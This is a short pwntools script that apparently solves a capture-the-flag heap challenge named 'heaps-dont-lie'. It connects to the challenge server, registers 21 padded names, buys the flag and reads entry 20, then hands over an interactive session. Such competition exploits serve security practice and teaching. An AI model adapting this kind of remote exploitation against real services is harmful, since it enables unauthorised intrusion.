from pwn import *

#r = process("./heaps-dont-lie")
r = remote("heaps-dont-lie.challenge.ctf.thefewchosen.com", 1341)

#gdb.attach(r)

r.recvuntil(b'4. Buy flag')


def register(name):
	r.sendline(b'1')
	r.recvuntil(b'Name?')
	r.sendline(name)
	r.recvuntil(b'4. Buy flag')

def show3(index):
	r.sendline(b'3')
	r.recvuntil(b'Shark number?')
	r.sendline(str(index))
	print(r.recvuntil(b'4. Buy flag'))


def buyflag():
	r.sendline(b'4')
	print(r.recvuntil(b'4. Buy flag'))

'''
payload = b'a'*15
register(payload)
payload = b'b'*31
register(payload)
payload = b'c'*15
register(payload)
'''
for _ in range(21):
	payload = b'a'*15
	register(payload)


buyflag()

show3(20)

r.interactive()